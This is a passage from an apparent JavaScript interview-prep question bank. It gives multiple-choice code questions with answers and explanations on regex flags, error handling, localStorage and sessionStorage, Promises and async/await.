**Explanation:** `/hello/gi` with `g` (global) + `i` (case-insensitive) matches all three occurrences. Without `m`, `^` only matches the start of the entire string. With `m` (multiline), `^` matches the start of each line. All three `"hello"` variants appear at line starts → 3 matches.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `s` (dotAll) flag change about the `.` metacharacter?

```javascript
const multiline = 'Hello\nWorld';
console.log(/Hello.World/.test(multiline));
console.log(/Hello.World/s.test(multiline));
```

- A) `true`, `true`
- B) `false`, `false`
- C) `false`, `true`
- D) `true`, `false`

**Answer: C) `false`, `true`**

**Explanation:** By default, `.` matches any character **except** newlines (`\n`, `\r`, etc.). Without the `s` flag, `/Hello.World/` does not match across a newline → `false`. With the `s` (dotAll) flag (ES2018), `.` matches **all** characters including newlines → `true`. This flag is essential for matching multi-line content.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a non-capturing group `(?:...)` produce?

```javascript
const str = '2024-05-15';
const withCapture = str.match(/(\d{4})-(\d{2})-(\d{2})/);
const withoutCapture = str.match(/(?:\d{4})-(?:\d{2})-(?:\d{2})/);
console.log(withCapture.length);
console.log(withoutCapture.length);
```

- A) `4`, `4`
- B) `4`, `1`
- C) `1`, `1`
- D) `3`, `3`

**Answer: B) `4`, `1`**

**Explanation:** `match()` (without `g`) returns an array where index 0 is the full match and indices 1+ are capture groups. With `()`: 1 full match + 3 groups = length 4. With `(?:)` (non-capturing groups): 1 full match only = length 1. Use `(?:)` when you need grouping for alternation/repetition but don\'t need to capture the value.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 13. Error Handling

<br>

## Q. A developer calls an API and handles errors. What does the following log?

```javascript
function riskyOp() {
  throw new TypeError("Invalid input");
}

try {
  riskyOp();
  console.log("success");
} catch (e) {
  console.log(e instanceof TypeError, e.message);
} finally {
  console.log("cleanup");
}
```

- A) `"success"`, `"cleanup"`
- B) `true "Invalid input"`, `"cleanup"`
- C) `true "Invalid input"` only
- D) `false "Invalid input"`, `"cleanup"`

**Answer: B) `true "Invalid input"`, `"cleanup"`**

**Explanation:** `throw new TypeError(...)` is caught by `catch`. `e instanceof TypeError` is `true`, and `e.message` is `"Invalid input"`. The `finally` block **always** runs regardless of whether an exception was thrown.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is logged when this runs?

```javascript
function parseJSON(str) {
  try {
    return JSON.parse(str);
  } catch {
    return null;
  }
}

console.log(parseJSON('{"name":"Alice"}'));
console.log(parseJSON("not json"));
```

- A) `{name: "Alice"}`, `null`
- B) `{name: "Alice"}`, `SyntaxError`
- C) `null`, `null`
- D) `"Alice"`, `null`

**Answer: A) `{name: "Alice"}`, `null`**

**Explanation:** Valid JSON is parsed successfully. `"not json"` causes `JSON.parse` to throw a `SyntaxError`, which is caught and `null` is returned. The optional catch binding (`catch` without a parameter) is valid ES2019+.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How do you create a custom error class?

```javascript
class ValidationError extends Error {
  constructor(message, field) {
    super(message);
    this.name = 'ValidationError';
    this.field = field;
  }
}

try {
  throw new ValidationError('Invalid email', 'email');
} catch (e) {
  console.log(e instanceof ValidationError);
  console.log(e instanceof Error);
  console.log(e.name, e.field);
}
```

- A) `true`, `false`, `"ValidationError"` `"email"`
- B) `true`, `true`, `"ValidationError"` `"email"`
- C) `false`, `true`, `"Error"` `"email"`
- D) `true`, `true`, `"Error"` `undefined`

**Answer: B) `true`, `true`, `"ValidationError"` `"email"`**

**Explanation:** `extends Error` makes `ValidationError` a subclass of `Error`, so `instanceof Error` is `true`. Setting `this.name` to `'ValidationError'` overrides the default name (otherwise it would show `"Error"`). Adding custom fields (`field`) lets callers extract structured error information.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output when `finally` has a `return` statement?

```javascript
function test() {
  try {
    return 'try';
  } finally {
    return 'finally';
  }
}
console.log(test());
```

- A) `"try"`
- B) `"finally"`
- C) `"try"`, then `"finally"`
- D) `undefined`

**Answer: B) `"finally"`**

**Explanation:** If the `finally` block has a `return` statement, it **overrides** the `return` from the `try` block. The `finally` block always executes, and its `return` takes precedence. This is a gotcha — avoid `return` in `finally` blocks as it can silently swallow return values from `try`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What different error types exist in JavaScript?

```javascript
const errors = [
  () => null.property,
  () => undeclaredVar,
  () => new Array(-1),
  () => decodeURIComponent('%'),
  () => eval('}{')
];

const types = errors.map(fn => {
  try { fn(); } catch(e) { return e.constructor.name; }
});
console.log(types);
```

- A) `["Error","Error","Error","Error","Error"]`
- B) `["TypeError","ReferenceError","RangeError","URIError","SyntaxError"]`
- C) `["TypeError","TypeError","RangeError","URIError","SyntaxError"]`
- D) `["TypeError","ReferenceError","RangeError","SyntaxError","SyntaxError"]`

**Answer: B) `["TypeError","ReferenceError","RangeError","URIError","SyntaxError"]`**

**Explanation:** `null.property` → `TypeError`. `undeclaredVar` → `ReferenceError`. `new Array(-1)` → `RangeError` (invalid length). `decodeURIComponent('%')` → `URIError` (malformed URI). `eval('}{')` → `SyntaxError`. Knowing error types helps write precise `catch` handlers.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does rethrowing an error enable?

```javascript
function processData(data) {
  try {
    JSON.parse(data);
  } catch (e) {
    if (e instanceof SyntaxError) {
      throw new Error(`Invalid data format: ${e.message}`);
    }
    throw e; // rethrow unknown errors
  }
}
try {
  processData('bad json');
} catch (e) {
  console.log(e.message.startsWith('Invalid'));
}
```

- A) `false` — the original SyntaxError is rethrown
- B) `true` — the error is wrapped with a descriptive message
- C) `TypeError` — cannot rethrow errors
- D) The error is silently swallowed

**Answer: B) `true` — the error is wrapped with a descriptive message**

**Explanation:** Rethrowing errors is a best practice for creating error layers. Catch only the errors you expect (`SyntaxError`), wrap them with context, and rethrow unknown errors to avoid swallowing bugs. The new message starts with `'Invalid'` → `startsWith` returns `true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Error.cause` provide?

```javascript
function fetchData(url) {
  try {
    throw new TypeError('Network timeout');
  } catch (originalError) {
    throw new Error('Failed to fetch data', { cause: originalError });
  }
}
try {
  fetchData('/api');
} catch (e) {
  console.log(e.message);
  console.log(e.cause instanceof TypeError);
}
```

- A) `"Failed to fetch data"`, `false`
- B) `"Network timeout"`, `true`
- C) `"Failed to fetch data"`, `true`
- D) `TypeError: Network timeout`

**Answer: C) `"Failed to fetch data"`, `true`**

**Explanation:** `Error.cause` (ES2022) allows chaining errors to preserve the original cause when wrapping errors. `new Error(msg, { cause: originalError })` stores the original error as `e.cause`. Logging tools can walk the `cause` chain to show the complete error context. `e.cause instanceof TypeError` → `true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What happens when an error is thrown inside a `finally` block?

```javascript
function test() {
  try {
    throw new Error('try error');
  } catch (e) {
    console.log('caught:', e.message);
    throw new Error('catch error');
  } finally {
    console.log('finally');
    // What if we also throw here?
  }
}
try {
  test();
} catch (e) {
  console.log('outer catch:', e.message);
}
```

- A) `"caught: try error"`, `"finally"`, `"outer catch: try error"`
- B) `"caught: try error"`, `"finally"`, `"outer catch: catch error"`
- C) `"finally"`, `"outer catch: catch error"`
- D) `"caught: try error"`, `"outer catch: catch error"`

**Answer: B) `"caught: try error"`, `"finally"`, `"outer catch: catch error"`**

**Explanation:** The sequence: `try` throws → `catch` logs `"caught: try error"` then throws a new error → `finally` runs (always!) → `finally` completes without throwing → the error from `catch` propagates → outer `catch` receives `"catch error"`. If `finally` threw, it would replace the `catch` error.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does an unhandled promise rejection produce?

```javascript
process.on('unhandledRejection', (reason) => {
  console.log('Unhandled:', reason.message);
});

Promise.reject(new Error('whoops'));
// vs
Promise.reject(new Error('handled')).catch(e => console.log('Caught:', e.message));
```

- A) Both are caught by the `process` handler
- B) `"Unhandled: whoops"` and `"Caught: handled"` — only uncaught rejections trigger the handler
- C) Both cause the process to crash
- D) `"Caught: handled"` only — unhandled rejections are silently ignored

**Answer: B) `"Unhandled: whoops"` and `"Caught: handled"` — only uncaught rejections trigger the handler**

**Explanation:** `unhandledRejection` fires for promises that have no rejection handler attached. The first `Promise.reject` has no `.catch()` → triggers the handler. The second has `.catch()` → handled normally. In Node.js, unhandled rejections can terminate the process in recent versions.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of a `try...catch` with an async function?

```javascript
async function failingOp() {
  throw new Error('async error');
}

async function main() {
  try {
    await failingOp();
  } catch (e) {
    console.log('Caught async error:', e.message);
  }
}

main().catch(e => console.log('Promise catch:', e.message));
```

- A) `"Promise catch: async error"`
- B) `"Caught async error: async error"`
- C) Both lines are logged
- D) Unhandled promise rejection

**Answer: B) `"Caught async error: async error"`**

**Explanation:** `await` unwraps rejected promises and throws them as synchronous exceptions inside the `async` function. The `try...catch` block catches it. The `.catch()` on `main()` is not triggered because `main()` itself doesn\'t throw — the error was handled internally.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a synchronous error thrown inside a Promise constructor do?

```javascript
const p = new Promise((resolve, reject) => {
  throw new Error('constructor error');
});

p.catch(e => console.log('Caught:', e.message));
```

- A) The error propagates synchronously and crashes immediately
- B) `"Caught: constructor error"` — thrown errors in Promise constructors are converted to rejections
- C) The error is silently swallowed
- D) `TypeError: Cannot throw inside Promise`

**Answer: B) `"Caught: constructor error"` — thrown errors in Promise constructors are converted to rejections**

**Explanation:** The Promise constructor wraps the executor in a try/catch. Any synchronous throw inside the executor is automatically converted into a rejection. This means `.catch()` can handle both explicit `reject()` calls and thrown errors equivalently.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of multiple nested try-catch blocks?

```javascript
function level3() { throw new RangeError('range error'); }
function level2() {
  try { level3(); }
  catch (e) {
    if (e instanceof TypeError) throw e;
    console.log('level2 handled:', e.constructor.name);
  }
}
function level1() {
  try { level2(); }
  catch (e) { console.log('level1 caught:', e.message); }
}
level1();
```

- A) `"level1 caught: range error"`
- B) `"level2 handled: RangeError"`
- C) `"level2 handled: RangeError"`, then `"level1 caught: range error"`
- D) Unhandled `RangeError`

**Answer: B) `"level2 handled: RangeError"`**

**Explanation:** `level3` throws a `RangeError`. `level2`\'s catch checks: `e instanceof TypeError` → `false` (it\'s a `RangeError`). So it logs `"level2 handled: RangeError"` and does NOT rethrow. The error is fully handled in `level2`. `level1`\'s catch never runs.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 14. Web Storage

<br>

## Q. A developer stores user preferences. What is the key difference between `localStorage` and `sessionStorage`?

```javascript
localStorage.setItem("theme", "dark");
sessionStorage.setItem("token", "abc123");
```

- A) `localStorage` stores numbers; `sessionStorage` stores strings
- B) `localStorage` persists across browser sessions; `sessionStorage` is cleared when the tab/window closes
- C) `sessionStorage` can store more data than `localStorage`
- D) `localStorage` is synchronous; `sessionStorage` is asynchronous

**Answer: B) `localStorage` persists across browser sessions; `sessionStorage` is cleared when the tab/window closes**

**Explanation:** `localStorage` data persists until explicitly cleared. `sessionStorage` is scoped to the browser tab/window session and is lost when it closes. Both share the same API and store data as strings.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the following storage code output?

```javascript
localStorage.setItem("count", 5);
let count = localStorage.getItem("count");
console.log(count + 1);
console.log(typeof count);
```

- A) `6`, `"number"`
- B) `"51"`, `"string"`
- C) `6`, `"string"`
- D) `NaN`, `"string"`

**Answer: B) `"51"`, `"string"`**

**Explanation:** Web Storage always stores and retrieves values as **strings**. Even though `5` was stored as a number, `getItem()` returns `"5"`. String concatenation: `"5" + 1 = "51"`. Parse first: `parseInt(count) + 1`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How do you properly store and retrieve an object in `localStorage`?

```javascript
const user = { name: 'Alice', age: 25, roles: ['admin', 'user'] };
localStorage.setItem('user', JSON.stringify(user));
const retrieved = JSON.parse(localStorage.getItem('user'));
console.log(retrieved.name);
console.log(Array.isArray(retrieved.roles));
console.log(retrieved === user);
```

- A) `"Alice"`, `true`, `true`
- B) `"Alice"`, `true`, `false`
- C) `undefined`, `false`, `false`
- D) `"Alice"`, `false`, `false`

**Answer: B) `"Alice"`, `true`, `false`**

**Explanation:** Objects must be serialized with `JSON.stringify()` before storage and deserialized with `JSON.parse()` on retrieval. The retrieved object is a new copy — it has the same values but is a different object reference (`retrieved === user` → `false`). Note: `JSON.stringify` loses functions, `undefined` values, and `Date` objects become strings.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How do you enumerate all keys in `localStorage`?

```javascript
localStorage.setItem('a', '1');
localStorage.setItem('b', '2');
localStorage.setItem('c', '3');

const keys = [];
for (let i = 0; i < localStorage.length; i++) {
  keys.push(localStorage.key(i));
}
console.log(keys.length);
```

- A) `0`
- B) `3`
- C) `undefined`
- D) `TypeError: localStorage.length is not defined`

**Answer: B) `3`**

**Explanation:** `localStorage.length` gives the number of stored items. `localStorage.key(i)` returns the key at position `i`. This is the standard way to enumerate all keys since `localStorage` is not directly iterable. Alternative: `Object.keys(localStorage)` also works in most browsers.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the `storage` event fire for?

```javascript
window.addEventListener('storage', (e) => {
  console.log('Key changed:', e.key);
  console.log('Old value:', e.oldValue);
  console.log('New value:', e.newValue);
});
localStorage.setItem('theme', 'dark');
```

- A) The `storage` event fires immediately after `setItem` in the same tab
- B) The `storage` event fires in OTHER tabs/windows sharing the same origin, not in the tab that made the change
- C) The `storage` event fires only when `removeItem` or `clear` is called
- D) The `storage` event fires in all tabs including the current one

**Answer: B) The `storage` event fires in OTHER tabs/windows sharing the same origin, not in the tab that made the change**

**Explanation:** The `storage` event is a cross-tab communication mechanism. It fires in all windows/tabs of the same origin **except** the one that triggered the change. This allows tabs to synchronize state (e.g., logout across tabs). The event object contains `key`, `oldValue`, `newValue`, and `url`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the typical storage limit for `localStorage`?

```javascript
// Each character in a JavaScript string is 2 bytes (UTF-16)
const oneMB = 'x'.repeat(512 * 1024); // ~1MB string
try {
  localStorage.setItem('large', oneMB);
  console.log('Stored successfully');
} catch (e) {
  console.log('Storage failed:', e.name);
}
```

- A) `"Storage failed: RangeError"` — limit is 100KB
- B) `"Stored successfully"` — `localStorage` has unlimited storage
- C) May log either, depending on available space. Typical limit is 5-10MB per origin
- D) `"Storage failed: SecurityError"` — large items are blocked for security

**Answer: C) May log either, depending on available space. Typical limit is 5-10MB per origin**

**Explanation:** `localStorage` is limited to approximately 5-10MB per origin (varies by browser). Exceeding the quota throws a `QuotaExceededError` (a `DOMException`). Always wrap `localStorage.setItem` in try-catch for large data. For larger storage needs, use `IndexedDB`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `removeItem` versus `clear` do?

```javascript
localStorage.setItem('a', '1');
localStorage.setItem('b', '2');
localStorage.setItem('c', '3');

localStorage.removeItem('b');
console.log(localStorage.length, localStorage.getItem('b'));

localStorage.clear();
console.log(localStorage.length);
```

- A) `3`, `null`, `0`
- B) `2`, `null`, `0`
- C) `2`, `undefined`, `0`
- D) `2`, `null`, `3`

**Answer: B) `2`, `null`, `0`**

**Explanation:** `removeItem('b')` removes only the `b` key. `length` drops from 3 to 2. `getItem('b')` returns `null` (not `undefined`) for missing keys. `clear()` removes **all** items in the storage for the origin → `length` becomes `0`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. Why is `localStorage` not suitable for sensitive data?

- A) `localStorage` is encrypted by the browser, so it\'s actually safe for passwords
- B) `localStorage` is accessible to any JavaScript on the page, making it vulnerable to XSS attacks
- C) `localStorage` is shared between all websites, so data can be read by other origins
- D) `localStorage` auto-syncs to the server, exposing data in transit

**Answer: B) `localStorage` is accessible to any JavaScript on the page, making it vulnerable to XSS attacks**

**Explanation:** If an attacker injects malicious JavaScript (XSS), they can read everything in `localStorage` with `localStorage.getItem()`. Never store tokens, passwords, or PII in `localStorage`. For authentication tokens, use `HttpOnly` cookies (inaccessible to JavaScript). If `localStorage` must be used, at minimum implement a Content Security Policy to prevent XSS.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What happens to `sessionStorage` when a tab is duplicated?

- A) The duplicated tab shares the same `sessionStorage` instance as the original
- B) The duplicated tab gets a copy of the `sessionStorage` from the original, but they are independent after that
- C) The duplicated tab has empty `sessionStorage`
- D) Duplicating tabs is not possible — each tab always starts with empty `sessionStorage`

**Answer: B) The duplicated tab gets a copy of the `sessionStorage` from the original, but they are independent after that**

**Explanation:** When a tab is duplicated (Ctrl+D or `window.open`), the new tab gets a copy of the original\'s `sessionStorage`. However, changes in one tab do not affect the other — they are independent. `sessionStorage` is scoped per-tab, not per-origin (unlike `localStorage` which is shared across all tabs of the same origin).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the difference between `localStorage` and cookies?

- A) Both are limited to 4KB and accessible from JavaScript
- B) Cookies can have expiry dates, are sent with HTTP requests, and can be `HttpOnly`; `localStorage` is larger, never sent to the server, and always JS-accessible
- C) `localStorage` is shared across all subdomains; cookies are domain-specific
- D) Cookies are stored on the server; `localStorage` is stored in the browser

**Answer: B) Cookies can have expiry dates, are sent with HTTP requests, and can be `HttpOnly`; `localStorage` is larger, never sent to the server, and always JS-accessible**

**Explanation:** Key differences: Cookies are automatically sent with every HTTP request (useful for auth) and can be `HttpOnly` (not accessible to JS, preventing XSS theft). `localStorage` is ~5-10MB (vs ~4KB for cookies), never sent to the server, and always accessible to JavaScript. Use cookies for auth tokens; `localStorage` for UI preferences.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does `localStorage` behave in private/incognito browsing?

- A) `localStorage` is completely disabled in private mode and throws errors
- B) `localStorage` works in private mode but is cleared when the private session ends (acts like `sessionStorage`)
- C) `localStorage` in private mode is shared with normal browsing data
- D) `localStorage` in private mode persists across private sessions

**Answer: B) `localStorage` works in private mode but is cleared when the private session ends (acts like `sessionStorage`)**

**Explanation:** In most browsers, `localStorage` in private/incognito mode is functional during the session but does not persist after the window closes — it behaves like `sessionStorage`. Code using `localStorage` generally works in private mode without errors, but developers should not rely on persistence for users who frequently browse privately.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `IndexedDB` provide that `localStorage` does not?

- A) Synchronous access to data
- B) Asynchronous, transactional storage with support for complex queries, indexes, and large binary data
- C) Smaller storage quota than `localStorage`
- D) HTTP cookie-like expiry dates for stored items

**Answer: B) Asynchronous, transactional storage with support for complex queries, indexes, and large binary data**

**Explanation:** `IndexedDB` is a full client-side database: async (non-blocking), supports transactions, complex queries via indexes, large storage (hundreds of MB to GBs), and binary data (`ArrayBuffer`, `Blob`). `localStorage` is synchronous (can block the UI), limited to ~5-10MB, and only stores strings. Use `IndexedDB` (or a library like `idb`) for structured or large data.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## L3: Advanced (Mid-Senior / Lead)

<br>

## # 15. Promises

<br>

## Q. A developer chains promises. What is logged?

```javascript
Promise.resolve(1)
  .then(x => x + 1)
  .then(x => { throw new Error("oops"); })
  .then(x => console.log("then:", x))
  .catch(e => console.log("catch:", e.message))
  .then(() => console.log("after catch"));
```

- A) `"then: 2"`, `"after catch"`
- B) `"catch: oops"`, `"after catch"`
- C) `"catch: oops"` only
- D) Unhandled Promise Rejection

**Answer: B) `"catch: oops"`, `"after catch"`**

**Explanation:** The chain starts resolving. The second `.then` throws, which skips the next `.then` and jumps to `.catch`. The `.catch` handles the error and returns `undefined` (a resolved promise), so `.then` after `.catch` runs.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer runs multiple API calls. What does `Promise.allSettled` return compared to `Promise.all`?

```javascript
const p1 = Promise.resolve("ok");
const p2 = Promise.reject("fail");
const p3 = Promise.resolve("also ok");

Promise.all([p1, p2, p3])
  .then(console.log)
  .catch(e => console.log("all:", e));

Promise.allSettled([p1, p2, p3])
  .then(results => results.forEach(r => console.log(r.status)));
```

- A) `"all: fail"`, `"fulfilled"`, `"rejected"`, `"fulfilled"`
- B) `"all: fail"` and nothing from `allSettled`
- C) Both print all three results
- D) `"all: fail"`, `"fulfilled"`, `"fulfilled"`, `"fulfilled"`

**Answer: A) `"all: fail"`, `"fulfilled"`, `"rejected"`, `"fulfilled"`**

**Explanation:** `Promise.all` short-circuits on the first rejection. `Promise.allSettled` waits for all promises to settle (regardless of outcome) and returns an array of `{ status, value/reason }` objects — never rejects.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Promise.race` return?

```javascript
const slow = new Promise(resolve => setTimeout(() => resolve('slow'), 200));
const fast = new Promise(resolve => setTimeout(() => resolve('fast'), 50));
const fail = new Promise((_, reject) => setTimeout(() => reject('error'), 100));

Promise.race([slow, fast, fail]).then(console.log).catch(console.log);
```

- A) `"slow"`
- B) `"fast"`
- C) `"error"`
- D) `["slow","fast","error"]`

**Answer: B) `"fast"`**

**Explanation:** `Promise.race` resolves or rejects as soon as the **first** promise settles (either resolves or rejects). `fast` resolves at 50ms, before `fail` rejects at 100ms and `slow` resolves at 200ms. `Promise.race` is useful for timeouts: `Promise.race([fetchData(), timeout(5000)])`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Promise.any` return?

```javascript
const p1 = Promise.reject('error 1');
const p2 = new Promise(resolve => setTimeout(() => resolve('success'), 100));
const p3 = Promise.reject('error 3');

Promise.any([p1, p2, p3])
  .then(v => console.log('Resolved:', v))
  .catch(e => console.log('All failed:', e.constructor.name));
```

- A) `"All failed: AggregateError"`
- B) `"Resolved: success"`
- C) `"Resolved: error 1"`
- D) Throws `TypeError`

**Answer: B) `"Resolved: success"`**

**Explanation:** `Promise.any` resolves with the **first fulfilled** promise, ignoring rejections. Only rejects with an `AggregateError` if **all** promises reject. Here, `p2` resolves (eventually) with `'success'`. Use `Promise.any` when you have multiple redundant sources and need the fastest successful result.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a Promise constructor\'s executor receive?

```javascript
const promise = new Promise((resolve, reject) => {
  console.log('executor runs synchronously');
  resolve(42);
  reject('too late');
  resolve(100);
});

promise.then(v => console.log('resolved:', v));
console.log('after creation');
```

- A) `"executor runs synchronously"`, `"after creation"`, `"resolved: 42"`
- B) `"after creation"`, `"executor runs synchronously"`, `"resolved: 42"`
- C) `"executor runs synchronously"`, `"resolved: 42"`, `"after creation"`
- D) `"executor runs synchronously"`, `"after creation"`, `"resolved: 42"`, then `"resolved: 100"`

**Answer: A) `"executor runs synchronously"`, `"after creation"`, `"resolved: 42"`**

**Explanation:** The executor runs **synchronously** when the Promise is created. A Promise can only be resolved once — additional `resolve`/`reject` calls after the first are silently ignored. `.then` callbacks are microtasks scheduled after the current synchronous code, so `"after creation"` logs before `"resolved: 42"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of a Promise chain with transformed values?

```javascript
Promise.resolve(1)
  .then(x => x + 1)
  .then(x => Promise.resolve(x * 3))
  .then(x => { return; })
  .then(x => console.log(x))
  .then(x => console.log(x));
```

- A) `6`, `6`
- B) `6`, `undefined`
- C) `undefined`, `undefined`
- D) `6`, `null`

**Answer: C) `undefined`, `undefined`**

**Explanation:** `1 + 1 = 2`, then `Promise.resolve(2 * 3) = 6`. The next `.then` returns `undefined` (no return value). After that, every chained `.then` also receives `undefined`. A bare `return` is equivalent to `return undefined`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How do you promisify a Node.js-style callback function?

```javascript
function readFileCallback(path, callback) {
  // Simulated: callback(null, 'file contents') or callback(error)
  setTimeout(() => callback(null, 'file contents'), 10);
}

function promisify(fn) {
  return function(...args) {
    return new Promise((resolve, reject) => {
      fn(...args, (err, result) => {
        if (err) reject(err);
        else resolve(result);
      });
    });
  };
}
const readFile = promisify(readFileCallback);
readFile('/path').then(console.log);
```

- A) Prints nothing — promisify doesn\'t work with async callbacks
- B) `"file contents"`
- C) `Promise { 'file contents' }`
- D) `TypeError: fn is not a function`

**Answer: B) `"file contents"`**

**Explanation:** `promisify` wraps a Node-style `(err, result)` callback function into a Promise. The `new Promise` executor calls the original function with the extra callback appended. On success, `resolve(result)` is called; on error, `reject(err)`. Node.js provides `util.promisify()` built-in.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output when `.then` is attached after a resolved Promise?

```javascript
const p = Promise.resolve('hello');
p.then(v => console.log('1:', v));
p.then(v => console.log('2:', v));
console.log('sync');
```

- A) `"1: hello"`, `"2: hello"`, `"sync"`
- B) `"sync"`, `"1: hello"`, `"2: hello"`
- C) `"sync"`, `"1: hello"` — only first .then fires
- D) `"1: hello"`, `"sync"`, `"2: hello"`

**Answer: B) `"sync"`, `"1: hello"`, `"2: hello"`**

**Explanation:** `.then` callbacks are always asynchronous microtasks, even if the Promise is already resolved. Synchronous code (`"sync"`) always runs first. Multiple `.then` handlers can be attached to the same promise — they all fire independently (not chained).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a Promise chain do with a thrown value in `.then`?

```javascript
Promise.resolve('start')
  .then(v => {
    throw new Error('step 1 failed');
  })
  .then(v => console.log('step 2:', v))
  .catch(e => {
    console.log('caught:', e.message);
    return 'recovered';
  })
  .then(v => console.log('step 3:', v));
```

- A) `"step 2: undefined"`, `"step 3: undefined"`
- B) `"caught: step 1 failed"`, `"step 3: recovered"`
- C) `"caught: step 1 failed"` only
- D) Unhandled rejection

**Answer: B) `"caught: step 1 failed"`, `"step 3: recovered"`**

**Explanation:** A `throw` in `.then` converts to a rejection, skipping all subsequent `.then` until a `.catch` is reached. `.catch` handles the error and returns `'recovered'` — a resolved value. The `.then` after `.catch` receives `'recovered'` and continues the chain.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of `Promise.allSettled` versus `Promise.all`?

```javascript
const promises = [
  Promise.resolve(1),
  Promise.reject('fail'),
  Promise.resolve(3)
];

Promise.all(promises)
  .then(v => console.log('all:', v))
  .catch(e => console.log('all failed:', e));

Promise.allSettled(promises)
  .then(results => console.log('settled count:', results.length));
```

- A) `"all: [1,'fail',3]"`, `"settled count: 3"`
- B) `"all failed: fail"`, `"settled count: 3"`
- C) `"all failed: fail"`, `"settled count: 2"`
- D) Neither prints — both reject

**Answer: B) `"all failed: fail"`, `"settled count: 3"`**

**Explanation:** `Promise.all` rejects immediately on the first rejection → `"all failed: fail"`. `Promise.allSettled` waits for all promises regardless and returns all results → `"settled count: 3"`. Use `allSettled` when you need results from all promises even if some fail.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a sequential Promise execution produce versus parallel?

```javascript
async function sequential() {
  const a = await Promise.resolve(1);
  const b = await Promise.resolve(2);
  return a + b;
}

async function parallel() {
  const [a, b] = await Promise.all([
    Promise.resolve(1),
    Promise.resolve(2)
  ]);
  return a + b;
}

// Both produce the same result but at different speeds for real async operations
sequential().then(console.log);
parallel().then(console.log);
```

- A) `3`, then `6`
- B) `3`, `3`
- C) `1`, `2`
- D) `3`, then `TypeError`

**Answer: B) `3`, `3`**

**Explanation:** Both produce `3` (1 + 2). The difference is performance: `sequential` awaits each promise one by one (if they took 1s each → 2s total). `parallel` starts both simultaneously via `Promise.all` (1s total). Always use `Promise.all` for independent async operations.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a deferred promise pattern produce?

```javascript
function createDeferred() {
  let resolve, reject;
  const promise = new Promise((res, rej) => {
    resolve = res;
    reject = rej;
  });
  return { promise, resolve, reject };
}

const deferred = createDeferred();
deferred.promise.then(v => console.log('resolved:', v));
setTimeout(() => deferred.resolve('late value'), 100);
```

- A) `"resolved: late value"` — the promise resolves after 100ms
- B) Nothing — the promise is never resolved
- C) `TypeError` — resolve cannot be stored outside the constructor
- D) `"resolved: undefined"` — resolve is called but without arguments

**Answer: A) `"resolved: late value"` — the promise resolves after 100ms**

**Explanation:** The Deferred pattern exposes the `resolve`/`reject` functions outside the Promise constructor by storing them. This allows resolving a promise from any external location. While useful in some patterns, prefer explicit async/await in most cases. The promise resolves with `'late value'` after 100ms.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 16. Async / Await

<br>

## Q. What is the output of this async/await code?

```javascript
async function fetchData() {
  return 42;
}

async function main() {
  const result = await fetchData();
  console.log(result);
  console.log(result + 1);
}

console.log("start");
main();
console.log("end");
```

- A) `"start"`, `42`, `43`, `"end"`
- B) `"start"`, `"end"`, `42`, `43`
- C) `42`, `43`, `"start"`, `"end"`
- D) `"start"`, `42`, `"end"`, `43`

**Answer: B) `"start"`, `"end"`, `42`, `43`**

**Explanation:** `console.log("start")` runs synchronously. `main()` is called and starts executing, but `await` suspends `main` and control returns to the call site. `console.log("end")` runs synchronously. Then the microtask queue resolves the awaited promise, and `42` and `43` log.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

